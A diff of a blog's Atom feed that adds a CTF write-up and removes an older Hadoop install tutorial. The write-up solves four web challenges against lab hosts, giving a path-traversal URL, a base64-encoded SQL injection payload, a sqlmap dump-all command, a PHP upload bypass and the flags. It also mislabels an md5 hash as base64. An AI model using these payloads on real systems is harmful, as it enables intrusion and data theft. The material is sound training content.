@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://timeorigin.cn/"/>
-  <updated>2017-06-28T11:35:20.460Z</updated>
+  <updated>2017-11-20T08:51:52.457Z</updated>
   <id>http://timeorigin.cn/</id>
   
   <author>
@@ -14,6 +14,115 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CTF</title>
+    <link href="http://timeorigin.cn/ctf/"/>
+    <id>http://timeorigin.cn/ctf/</id>
+    <published>2017-11-20T08:32:10.000Z</published>
+    <updated>2017-11-20T08:51:52.457Z</updated>
+    
+    <content type="html"><![CDATA[<p></p><p style="text-align: center;"> Junyangz | emhhbmdqdW55YW5nMTdAbWFpbHMudWNhcy5hYy5jbg==</p>
+<h1 id="签。。签到题？"><a href="#签。。签到题？" class="headerlink" title="签。。签到题？"></a>签。。签到题？</h1><h2 id="你想要什么？告诉我"><a href="#你想要什么？告诉我" class="headerlink" title="你想要什么？告诉我"></a>你想要什么？告诉我</h2><p><a href="http://124.16.71.62:30004" target="_blank" rel="external">http://124.16.71.62:30004</a></p>
+<ol>
+<li>input ‘flag’</li>
+<li>get ZmxhZ3tXZWxDMG1lX3RvX2N0ZjJ9</li>
+<li>base64.decode(ZmxhZ3tXZWxDMG1lX3RvX2N0ZjJ9)</li>
+<li>get “flag{WelC0me_to_ctf2}”</li>
+</ol>
+<h1 id="文。。文件包含？"><a href="#文。。文件包含？" class="headerlink" title="文。。文件包含？"></a>文。。文件包含？</h1><a id="more"></a>
+<h2 id="嘻嘻，我是flag，来包我啊"><a href="#嘻嘻，我是flag，来包我啊" class="headerlink" title="嘻嘻，我是flag，来包我啊~~"></a>嘻嘻，我是flag，来包我啊~~</h2><p><a href="http://124.16.71.62:30005/page.php" target="_blank" rel="external">http://124.16.71.62:30005/page.php</a></p>
+<ol>
+<li><p>Index page<br> This index page<br> <a href="http://124.16.71.62:30005/page.php?file=another" target="_blank" rel="external">another page</a></p>
+</li>
+<li><p>This is another page<br> This is another page<br> But nothing<br> <a href="http://124.16.71.62:30005/page.php?file=index" target="_blank" rel="external">return index page</a></p>
+</li>
+<li><p>observe url get file bypass</p>
+<ul>
+<li>inspect source code </li>
+<li><p>find </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">john@ubuntu:/var/www$ tree</div><div class="line">.</div><div class="line">├── flag</div><div class="line">└── html</div><div class="line">    ├──page.php</div><div class="line">    ├──index</div><div class="line">    ├──another</div><div class="line">&lt;!--</div><div class="line"><span class="keyword">if</span> (strpos(<span class="variable">$file_path</span>, <span class="string">"."</span>) === 0 || substr_count(<span class="variable">$file_path</span>, <span class="string">".."</span>) &gt; 2) &#123;</div><div class="line">    <span class="built_in">echo</span> <span class="string">"&lt;p&gt;malicious parameter&lt;/&gt;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>constract file bypass<br><a href="http://124.16.71.62:30005/page.php?file=/html/../flag" target="_blank" rel="external">http://124.16.71.62:30005/page.php?file=/html/../flag</a></p>
+</li>
+</ul>
+</li>
+<li><p>get flag</p>
+<p> <strong>flag{Bypass_File_Path_Check}</strong></p>
+</li>
+</ol>
+<h1 id="S。。SQL注入？"><a href="#S。。SQL注入？" class="headerlink" title="S。。SQL注入？"></a>S。。SQL注入？</h1><h2 id="听说flag表的value字段里面有好东西。。"><a href="#听说flag表的value字段里面有好东西。。" class="headerlink" title="听说flag表的value字段里面有好东西。。"></a>听说flag表的value字段里面有好东西。。</h2><p><a href="http://124.16.71.62:30006/?id=MQ==" target="_blank" rel="external">http://124.16.71.62:30006/?id=MQ==</a></p>
+<ol>
+<li><p>base64.decode(MQ== ) = 1</p>
+</li>
+<li><p>use sqlmap </p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C:\python27\python.exe  .\sqlmap.py -u<span class="string">"http://124.16.71.62:30006/?id=NA=="</span>  --tamper base64encode.py -b --current-user --current-db  --tables  --columns --dump-all</div></pre></td></tr></table></figure>
+</li>
+<li><p>common method</p>
+<ul>
+<li>id= 1  union select 1,value from flag</li>
+<li>base64.encode(id=1 union select 1,value from flag)<br>  = MSAgdW5pb24gc2VsZWN0IDEsdmFsdWUgZnJvbSBmbGFn</li>
+<li><a href="http://124.16.71.62:30006/?id=MSAgdW5pb24gc2VsZWN0IDEsdmFsdWUgZnJvbSBmbGFn" target="_blank" rel="external">http://124.16.71.62:30006/?id=MSAgdW5pb24gc2VsZWN0IDEsdmFsdWUgZnJvbSBmbGFn</a></li>
+</ul>
+</li>
+<li><p>get flag</p>
+<p> <strong>flag{Have_Fun_In_SQL_Injection}</strong></p>
+</li>
+</ol>
+<h1 id="Upload-and-get-flag"><a href="#Upload-and-get-flag" class="headerlink" title="Upload and get flag?"></a>Upload and get flag?</h1><h2 id="听说编辑文件的时候突然断电会产生swp文件呢"><a href="#听说编辑文件的时候突然断电会产生swp文件呢" class="headerlink" title="听说编辑文件的时候突然断电会产生swp文件呢~"></a>听说编辑文件的时候突然断电会产生swp文件呢~</h2><p><a href="http://124.16.71.62:30007/" target="_blank" rel="external">http://124.16.71.62:30007/</a></p>
+<p><a href="http://124.16.71.62:30007/index.php" target="_blank" rel="external">http://124.16.71.62:30007/index.php</a><br><a href="http://124.16.71.62:30007/.index.php.swp" target="_blank" rel="external">http://124.16.71.62:30007/.index.php.swp</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">curl -o .index.php.swp http://124.16.71.62:30007/.index.php.swp</div><div class="line">vim -r .index.php.swp</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ($_FILES)&#123;</div><div class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"Error: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br /&gt;"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] !== <span class="string">"image/jpeg"</span>)&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"stop hacking!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span> &gt; <span class="number">2048</span>)&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"size too big!"</span>);</div><div class="line">        &#125;</div><div class="line">        $file_tmp = fopen($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">'rb'</span>);</div><div class="line">        $bin = fread($file_tmp, <span class="number">2</span>);</div><div class="line">        fclose($file_tmp);</div><div class="line">        $data = unpack(<span class="string">'C2chars'</span>, $bin);</div><div class="line">        $type_code = intval($data[<span class="string">'chars1'</span>].$data[<span class="string">'chars2'</span>]);</div><div class="line">        $flag = <span class="number">0</span>;</div><div class="line">        <span class="keyword">switch</span> ($type_code) &#123;</div><div class="line">            <span class="keyword">case</span> <span class="number">255216</span>:</div><div class="line">                $fileType = <span class="string">'jpg'</span>;</div><div class="line">                $flag = <span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">13780</span>:</div><div class="line">                $fileType = <span class="string">'png'</span>;</div><div class="line">                $flag = <span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">default</span>:</div><div class="line">                $fileType = <span class="string">'unknown'</span>;</div><div class="line">                <span class="keyword">die</span>(<span class="string">"error file head!"</span>);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> ($flag === <span class="number">1</span>)&#123;</div><div class="line">            $filetype = substr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], strrpos($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], <span class="string">'.'</span>));</div><div class="line">            $filename = md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]) . $filetype;</div><div class="line">            <span class="keyword">if</span> (strtolower($filetype) === <span class="string">".php"</span>)&#123;</div><div class="line">                copy(<span class="string">'../flag'</span>, $filename);</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $filename);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"&lt;h1&gt;成功&lt;/h1&gt;"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<h2 id="All-Summary"><a href="#All-Summary" class="headerlink" title="All Summary"></a>All Summary</h2><ol>
+<li><p>upload php file</p>
+<ul>
+<li>use burp suite modify filename Junyangz.jpg to Junyangz.php</li>
+</ul>
+</li>
+<li><p>get file location</p>
+<ul>
+<li>analyse index.php by .index.php.swp</li>
+<li><p>get the file name :</p>
+<blockquote>
+<p>$filename = md5($_FILES[“file”][“name”]) . $filetype;</p>
+</blockquote>
+</li>
+<li><p>base64.encode(Junyangz.php)=f0480f39a6cb1a1ff5f55021ac0824f7</p>
+</li>
+<li>as f0480f39a6cb1a1ff5f55021ac0824f7.php</li>
+</ul>
+</li>
+<li><p>get flag:</p>
+<ul>
+<li><p><a href="http://124.16.71.62:30007/f0480f39a6cb1a1ff5f55021ac0824f7.php" target="_blank" rel="external">http://124.16.71.62:30007/f0480f39a6cb1a1ff5f55021ac0824f7.php</a></p>
+</li>
+<li><p><strong>flag{Upl0ad_w1lL_get_fl4g}</strong></p>
+</li>
+</ul>
+</li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;p style=&quot;text-align: center;&quot;&gt; Junyangz | emhhbmdqdW55YW5nMTdAbWFpbHMudWNhcy5hYy5jbg==&lt;/p&gt;
+&lt;h1 id=&quot;签。。签到题？&quot;&gt;&lt;a href=&quot;#签。。签到题？&quot; class=&quot;headerlink&quot; title=&quot;签。。签到题？&quot;&gt;&lt;/a&gt;签。。签到题？&lt;/h1&gt;&lt;h2 id=&quot;你想要什么？告诉我&quot;&gt;&lt;a href=&quot;#你想要什么？告诉我&quot; class=&quot;headerlink&quot; title=&quot;你想要什么？告诉我&quot;&gt;&lt;/a&gt;你想要什么？告诉我&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://124.16.71.62:30004&quot;&gt;http://124.16.71.62:30004&lt;/a&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;input ‘flag’&lt;/li&gt;
+&lt;li&gt;get ZmxhZ3tXZWxDMG1lX3RvX2N0ZjJ9&lt;/li&gt;
+&lt;li&gt;base64.decode(ZmxhZ3tXZWxDMG1lX3RvX2N0ZjJ9)&lt;/li&gt;
+&lt;li&gt;get “flag{WelC0me_to_ctf2}”&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&quot;文。。文件包含？&quot;&gt;&lt;a href=&quot;#文。。文件包含？&quot; class=&quot;headerlink&quot; title=&quot;文。。文件包含？&quot;&gt;&lt;/a&gt;文。。文件包含？&lt;/h1&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://timeorigin.cn/categories/Web-Security/"/>
+    
+    
+      <category term="ctf" scheme="http://timeorigin.cn/tags/ctf/"/>
+    
+  </entry>
   
   <entry>
     <title>Hadoop HA &amp; Hbase etc cluster on Vultr</title>
@@ -463,205 +572,6 @@
       <category term="Let&#39;s Encrypt" scheme="http://timeorigin.cn/tags/Let-s-Encrypt/"/>
     
       <category term="HTTPS" scheme="http://timeorigin.cn/tags/HTTPS/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>How to Install Hadoop on Ubuntu 13.10</title>
-    <link href="http://timeorigin.cn/how-to-install-hadoop-on-ubuntu-13-10/"/>
-    <id>http://timeorigin.cn/how-to-install-hadoop-on-ubuntu-13-10/</id>
-    <published>2016-06-06T09:29:49.000Z</published>
-    <updated>2017-03-16T16:15:47.117Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="Prerequisites"><a href="#Prerequisites" class="headerlink" title="Prerequisites"></a>Prerequisites</h3><p>The only prerequisite for this tutorial is a VPS with <strong>Ubuntu 13.10 x64</strong> installed.</p>
-<p>You will need to execute commands from the command line which you can do in one of the two ways:</p>
-<ol>
-<li>Use SSH to access the droplet.</li>
-<li>Use the ‘Console Access’ from the Digital Ocean Droplet Management Panel<div data-unique="what-is-hadoop"></div>
-
-</li>
-</ol>
-<h2 id="What-is-Hadoop"><a href="#What-is-Hadoop" class="headerlink" title="What is Hadoop?"></a>What is Hadoop?</h2><a id="more"></a>
-<p><a href="http://hadoop.apache.org/" target="_blank" rel="external">Hadoop</a> is a framework (consisting of software libraries) which simplifies the processing of data sets distributed across clusters of servers. Two of the main components of Hadoop are <strong>HDFS</strong> and <strong>MapReduce</strong>.</p>
-<p>HDFS is the filesystem that is used by Hadoop to store all the data on. This file system spans across all the nodes that are being used by Hadoop. These nodes could be on a single VPS or they can be spread across a large number of virtual servers.</p>
-<p>MapReduce is the framework that orchestrates all of Hadoop’s activities. It handles the assignment of work to different nodes in the cluster.</p>
-<div data-unique="benefits-of-using-hadoop"></div>
-
-<h2 id="Benefits-of-using-Hadoop"><a href="#Benefits-of-using-Hadoop" class="headerlink" title="Benefits of using Hadoop"></a>Benefits of using Hadoop</h2><p>The architecture of Hadoop allows you to scale your hardware as and when you need to. New nodes can be added incrementally without having to worry about the change in data formats or the handling of applications that sit on the file system.</p>
-<p>One of the most important features of Hadoop is that it allows you to save enormous amounts of money by substituting cheap commodity servers for expensive ones. This is possible because Hadoop transfers the responsibility of fault tolerance from the hardware layer to the application layer.</p>
-<div data-unique="installing-hadoop"></div>
-
-<h2 id="Installing-Hadoop"><a href="#Installing-Hadoop" class="headerlink" title="Installing Hadoop"></a>Installing Hadoop</h2><p>Installing and getting Hadoop up and running is quite straightforward. However, since this process requires editing multiple configuration and setup files, make sure that each step is properly followed.</p>
-<h3 id="1-Install-Java"><a href="#1-Install-Java" class="headerlink" title="1. Install Java"></a>1. Install Java</h3><p>Hadoop requires Java to be installed, so let’s begin by installing Java:</p>
-<pre><code>apt-get update
-apt-get install default-jdk
-`&lt;/pre&gt;
-These commands will update the package information on your VPS and then install Java. After executing these commands, execute the following command to verify that Java has been installed:
-&lt;pre class=&quot;code-pre &quot;&gt;`java -version
-`&lt;/pre&gt;
-If Java has been installed, this should display the version details as illustrated in the following image:
-
-![Java Verification](https://assets.digitalocean.com/articles/Ubuntu_Hadoop/1.png &quot;Java Verification&quot;)
-
-### 2\. Create and Setup SSH Certificates
-
-Hadoop uses SSH (to access its nodes) which would normally require the user to enter a password. However, this requirement can be eliminated by creating and setting up SSH certificates using the following commands:
-&lt;pre class=&quot;code-pre &quot;&gt;`ssh-keygen -t rsa -P &apos;&apos;
-cat ~/.ssh/id_rsa.pub &amp;gt;&amp;gt; ~/.ssh/authorized_keys
-`&lt;/pre&gt;
-After executing the first of these two commands, you might be asked for a filename. Just leave it blank and press the enter key to continue. The second command adds the newly created key to the list of authorized keys so that Hadoop can use SSH without prompting for a password.
-
-![Setup SSH Certificates](https://assets.digitalocean.com/articles/Ubuntu_Hadoop/2.png &quot;Setup SSH Certificates&quot;)
-
-### 3\. Fetch and Install Hadoop
-
-First let&apos;s fetch Hadoop from one of the mirrors using the following command:
-&lt;pre class=&quot;code-pre &quot;&gt;`wget http://www.motorlogy.com/apache/hadoop/common/current/hadoop-2.3.0.tar.gz
-`&lt;/pre&gt;
-**Note:** _This command uses a download a link on one of the mirrors listed on the Hadoop website. The list of mirrors can be found [on this link](http://www.apache.org/dyn/closer.cgi/hadoop/common/). You can choose any other mirror if you want to. To download the latest stable version, choose the *_hadoop-X.Y.Z.tar.gz** file from the **current** or the **current2** directory on your chosen mirror.*
-
-After downloading the Hadoop package, execute the following command to extract it:
-&lt;pre class=&quot;code-pre &quot;&gt;`tar xfz hadoop-2.3.0.tar.gz
-`&lt;/pre&gt;
-This command will extract all the files in this package in a directory named `hadoop-2.3.0`. For this tutorial, the Hadoop installation will be moved to the `/usr/local/hadoop` directory using the following command:
-&lt;pre class=&quot;code-pre &quot;&gt;`mv hadoop-2.3.0 /usr/local/hadoop 
-`&lt;/pre&gt;
-**Note:** _The name of the extracted folder depends on the Hadoop version your have downloaded and extracted. If your version differs from the one used in this tutorial, change the above command accordingly._
-
-### 4\. Edit and Setup Configuration Files
-
-To complete the setup of Hadoop, the following files will have to be modified:
-</code></pre><ul>
-<li>~/.bashrc</li>
-<li>/usr/local/hadoop/etc/hadoop/hadoop-env.sh</li>
-<li>/usr/local/hadoop/etc/hadoop/core-site.xml</li>
-<li>/usr/local/hadoop/etc/hadoop/yarn-site.xml</li>
-<li>/usr/local/hadoop/etc/hadoop/mapred-site.xml.template</li>
-<li><p>/usr/local/hadoop/etc/hadoop/hdfs-site.xml</p>
-<h4 id="i-Editing-bashrc"><a href="#i-Editing-bashrc" class="headerlink" title="i. Editing ~/.bashrc"></a>i. Editing ~/.bashrc</h4><p>Before editing the <code>.bashrc</code> file in your home directory, we need to find the path where Java has been installed to set the <code>JAVA_HOME</code> environment variable. Let’s use the following command to do that:<br><pre class="code-pre "><code>update-alternatives --config java</code></pre><br>This will display something like the following:</p>
-<p><img src="https://assets.digitalocean.com/articles/Ubuntu_Hadoop/3.png" alt="Get Java Path" title="Get Java Path"></p>
-<p>The complete path displayed by this command is:<br><pre class="code-pre "><code>/usr/lib/jvm/java-7-openjdk-amd64/jre/bin/java</code></pre><br>The value for <code>JAVA_HOME</code> is everything before <code>/jre/bin/java</code> in the above path - in this case,<code>/usr/lib/jvm/java-7-openjdk-amd64</code>. Make a note of this as we’ll be using this value in this step and in one other step.</p>
-<p>Now use <code>nano</code> (or your favored editor) to edit ~/.bashrc using the following command:<br><pre class="code-pre "><code>nano ~/.bashrc</code></pre><br>This will open the <code>.bashrc</code> file in a text editor. Go to the end of the file and paste/type the following content in it:<br><pre class="code-pre "><code>#HADOOP VARIABLES START
-export JAVA_HOME=/usr/lib/jvm/java-7-openjdk-amd64
-export HADOOP_INSTALL=/usr/local/hadoop
-export PATH=$PATH:$HADOOP_INSTALL/bin
-export PATH=$PATH:$HADOOP_INSTALL/sbin
-export HADOOP_MAPRED_HOME=$HADOOP_INSTALL
-export HADOOP_COMMON_HOME=$HADOOP_INSTALL
-export HADOOP_HDFS_HOME=$HADOOP_INSTALL
-export YARN_HOME=$HADOOP_INSTALL
-export HADOOP_COMMON_LIB_NATIVE_DIR=$HADOOP_INSTALL/lib/native
-export HADOOP_OPTS=&quot;-Djava.library.path=$HADOOP_INSTALL/lib&quot;
-#HADOOP VARIABLES END</code></pre><br><strong>Note 1:</strong> _If the value of <code>JAVA_HOME</code> is different on your VPS, make sure to alter the first <code>export</code> statement in the above content accordingly._</p>
-<p><strong>Note 2:</strong> <em>Files opened and edited using nano can be saved using <code>Ctrl + X</code>. Upon the prompt to save changes, type <code>Y</code>. If you are asked for a filename, just press the enter key.</em></p>
-<p>The end of the <code>.bashrc</code> file should look something like this:</p>
-<p><img src="https://assets.digitalocean.com/articles/Ubuntu_Hadoop/4.png" alt=".bashrc contents" title=".bashrc contens"></p>
-<p>After saving and closing the <code>.bashrc</code> file, execute the following command so that your system recognizes the newly created environment variables:<br><pre class="code-pre "><code>source ~/.bashrc</code></pre><br>Putting the above content in the <code>.bashrc</code> file ensures that these variables are always available when your VPS starts up.</p>
-<h3 id="ii-Editing-usr-local-hadoop-etc-hadoop-hadoop-env-sh"><a href="#ii-Editing-usr-local-hadoop-etc-hadoop-hadoop-env-sh" class="headerlink" title="ii. Editing /usr/local/hadoop/etc/hadoop/hadoop-env.sh"></a>ii. Editing /usr/local/hadoop/etc/hadoop/hadoop-env.sh</h3><p>Open the <code>/usr/local/hadoop/etc/hadoop/hadoop-env.sh</code> file with nano using the following command:<br><pre class="code-pre "><code>nano /usr/local/hadoop/etc/hadoop/hadoop-env.sh</code></pre><br>In this file, locate the line that exports the <code>JAVA_HOME</code> variable. Change this line to the following:<br><pre class="code-pre "><code>export JAVA_HOME=/usr/lib/jvm/java-7-openjdk-amd64</code></pre><br><strong>Note:</strong> _If the value of <code>JAVA_HOME</code> is different on your VPS, make sure to alter this line accordingly._</p>
-<p>The <code>hadoop-env.sh</code> file should look something like this:</p>
-<p><img src="https://assets.digitalocean.com/articles/Ubuntu_Hadoop/5.png" alt="hadoop-env.sh contents" title="hadoop-env.sh contents"></p>
-<p>Save and close this file. Adding the above statement in the <code>hadoop-env.sh</code> file ensures that the value of<code>JAVA_HOME</code> variable will be available to Hadoop whenever it is started up.</p>
-<h3 id="iii-Editing-usr-local-hadoop-etc-hadoop-core-site-xml"><a href="#iii-Editing-usr-local-hadoop-etc-hadoop-core-site-xml" class="headerlink" title="iii. Editing /usr/local/hadoop/etc/hadoop/core-site.xml"></a>iii. Editing /usr/local/hadoop/etc/hadoop/core-site.xml</h3><p>The <code>/usr/local/hadoop/etc/hadoop/core-site.xml</code> file contains configuration properties that Hadoop uses when starting up. This file can be used to override the default settings that Hadoop starts with.</p>
-<p>Open this file with nano using the following command:<br><pre class="code-pre "><code>nano /usr/local/hadoop/etc/hadoop/core-site.xml</code></pre><br>In this file, enter the following content in between the <code>&amp;lt;configuration&amp;gt;&amp;lt;/configuration&amp;gt;</code> tag:<br><pre class="code-pre "><code>&amp;lt;property&amp;gt;
-   &amp;lt;name&amp;gt;fs.default.name&amp;lt;/name&amp;gt;
-   &amp;lt;value&amp;gt;hdfs://localhost:9000&amp;lt;/value&amp;gt;
-&amp;lt;/property&amp;gt;</code></pre><br>The <code>core-site.xml</code> file should look something like this:</p>
-<p><img src="https://assets.digitalocean.com/articles/Ubuntu_Hadoop/6.png" alt="core-site.xml contents" title="core-site.xml contents"></p>
-<p>Save and close this file.</p>
-<h3 id="iv-Editing-usr-local-hadoop-etc-hadoop-yarn-site-xml"><a href="#iv-Editing-usr-local-hadoop-etc-hadoop-yarn-site-xml" class="headerlink" title="iv. Editing /usr/local/hadoop/etc/hadoop/yarn-site.xml"></a>iv. Editing /usr/local/hadoop/etc/hadoop/yarn-site.xml</h3><p>The <code>/usr/local/hadoop/etc/hadoop/yarn-site.xml</code> file contains configuration properties that MapReduce uses when starting up. This file can be used to override the default settings that MapReduce starts with.</p>
-<p>Open this file with nano using the following command:<br><pre class="code-pre "><code>nano /usr/local/hadoop/etc/hadoop/yarn-site.xml</code></pre><br>In this file, enter the following content in between the <code>&amp;lt;configuration&amp;gt;&amp;lt;/configuration&amp;gt;</code> tag:<br><pre class="code-pre "><code>&amp;lt;property&amp;gt;
-   &amp;lt;name&amp;gt;yarn.nodemanager.aux-services&amp;lt;/name&amp;gt;
-   &amp;lt;value&amp;gt;mapreduce_shuffle&amp;lt;/value&amp;gt;
-&amp;lt;/property&amp;gt;
-&amp;lt;property&amp;gt;
-   &amp;lt;name&amp;gt;yarn.nodemanager.aux-services.mapreduce.shuffle.class&amp;lt;/name&amp;gt;
-   &amp;lt;value&amp;gt;org.apache.hadoop.mapred.ShuffleHandler&amp;lt;/value&amp;gt;
-&amp;lt;/property&amp;gt;</code></pre><br>The <code>yarn-site.xml</code> file should look something like this:</p>
-<p><img src="https://assets.digitalocean.com/articles/Ubuntu_Hadoop/7.png" alt="yarn-site.xml contents" title="yarn-site.xml contents"></p>
-<p>Save and close this file.</p>
-<h3 id="v-Creating-and-Editing-usr-local-hadoop-etc-hadoop-mapred-site-xml"><a href="#v-Creating-and-Editing-usr-local-hadoop-etc-hadoop-mapred-site-xml" class="headerlink" title="v. Creating and Editing /usr/local/hadoop/etc/hadoop/mapred-site.xml"></a>v. Creating and Editing /usr/local/hadoop/etc/hadoop/mapred-site.xml</h3><p>By default, the <code>/usr/local/hadoop/etc/hadoop/</code> folder contains the <code>/usr/local/hadoop/etc/hadoop/mapred-site.xml.template</code> file which has to be renamed/copied with the name <code>mapred-site.xml</code>. This file is used to specify which framework is being used for MapReduce.</p>
-<p>This can be done using the following command:<br><pre class="code-pre "><code>cp /usr/local/hadoop/etc/hadoop/mapred-site.xml.template /usr/local/hadoop/etc/hadoop/mapred-site.xml</code></pre><br>Once this is done, open the newly created file with nano using the following command:<br><pre class="code-pre "><code>nano /usr/local/hadoop/etc/hadoop/mapred-site.xml</code></pre><br>In this file, enter the following content in between the <code>&amp;lt;configuration&amp;gt;&amp;lt;/configuration&amp;gt;</code> tag:<br><pre class="code-pre "><code>&amp;lt;property&amp;gt;
-   &amp;lt;name&amp;gt;mapreduce.framework.name&amp;lt;/name&amp;gt;
-   &amp;lt;value&amp;gt;yarn&amp;lt;/value&amp;gt;
-&amp;lt;/property&amp;gt;</code></pre><br>The <code>mapred-site.xml</code> file should look something like this:</p>
-<p><img src="https://assets.digitalocean.com/articles/Ubuntu_Hadoop/8.png" alt="mapred-site.xml contents" title="mapred-site.xml contents"></p>
-<p>Save and close this file.</p>
-<h3 id="vi-Editing-usr-local-hadoop-etc-hadoop-hdfs-site-xml"><a href="#vi-Editing-usr-local-hadoop-etc-hadoop-hdfs-site-xml" class="headerlink" title="vi. Editing /usr/local/hadoop/etc/hadoop/hdfs-site.xml"></a>vi. Editing /usr/local/hadoop/etc/hadoop/hdfs-site.xml</h3><p>The <code>/usr/local/hadoop/etc/hadoop/hdfs-site.xml</code> has to be configured for each host in the cluster that is being used. It is used to specify the directories which will be used as the <strong>namenode</strong> and the <strong>datanode</strong> on that host.</p>
-<p>Before editing this file, we need to create two directories which will contain the <strong>namenode</strong> and the<strong>datanode</strong> for this Hadoop installation. This can be done using the following commands:<br><pre class="code-pre "><code>mkdir -p /usr/local/hadoop_store/hdfs/namenode
-mkdir -p /usr/local/hadoop_store/hdfs/datanode</code></pre><br><strong>Note:</strong> <em>You can create these directories in different locations, but make sure to modify the contents of<code>hdfs-site.xml</code> accordingly.</em></p>
-<p>Once this is done, open the <code>/usr/local/hadoop/etc/hadoop/hdfs-site.xml</code> file with nano using the following command:<br><pre class="code-pre "><code>nano /usr/local/hadoop/etc/hadoop/hdfs-site.xml</code></pre><br>In this file, enter the following content in between the <code>&amp;lt;configuration&amp;gt;&amp;lt;/configuration&amp;gt;</code> tag:<br><pre class="code-pre "><code>&amp;lt;property&amp;gt;
-   &amp;lt;name&amp;gt;dfs.replication&amp;lt;/name&amp;gt;
-   &amp;lt;value&amp;gt;1&amp;lt;/value&amp;gt;
- &amp;lt;/property&amp;gt;
- &amp;lt;property&amp;gt;
-   &amp;lt;name&amp;gt;dfs.namenode.name.dir&amp;lt;/name&amp;gt;
-   &amp;lt;value&amp;gt;file:/usr/local/hadoop_store/hdfs/namenode&amp;lt;/value&amp;gt;
- &amp;lt;/property&amp;gt;
- &amp;lt;property&amp;gt;
-   &amp;lt;name&amp;gt;dfs.datanode.data.dir&amp;lt;/name&amp;gt;
-   &amp;lt;value&amp;gt;file:/usr/local/hadoop_store/hdfs/datanode&amp;lt;/value&amp;gt;
- &amp;lt;/property&amp;gt;</code></pre><br>The <code>hdfs-site.xml</code> file should look something like this:</p>
-<p><img src="https://assets.digitalocean.com/articles/Ubuntu_Hadoop/9.png" alt="hdfs-site.xml contents" title="hdfs-site.xml contents"></p>
-<p>Save and close this file.</p>
-<div data-unique="format-the-new-hadoop-filesystem"></div>
-
-<h2 id="Format-the-New-Hadoop-Filesystem"><a href="#Format-the-New-Hadoop-Filesystem" class="headerlink" title="Format the New Hadoop Filesystem"></a>Format the New Hadoop Filesystem</h2><p>After completing all the configuration outlined in the above steps, the Hadoop filesystem needs to be formatted so that it can start being used. This is done by executing the following command:<br><pre class="code-pre "><code>hdfs namenode -format</code></pre><br><strong>Note:</strong> <em>This only needs to be done once before you start using Hadoop. If this command is executed again after Hadoop has been used, it’ll destroy all the data on the Hadoop file system.</em></p>
-<div data-unique="start-hadoop"></div>
-
-<h2 id="Start-Hadoop"><a href="#Start-Hadoop" class="headerlink" title="Start Hadoop"></a>Start Hadoop</h2><p>All that remains to be done is starting the newly installed single node cluster:<br><pre class="code-pre "><code>start-dfs.sh</code></pre><br>While executing this command, you’ll be prompted twice with a message similar to the following:</p>
-<blockquote>
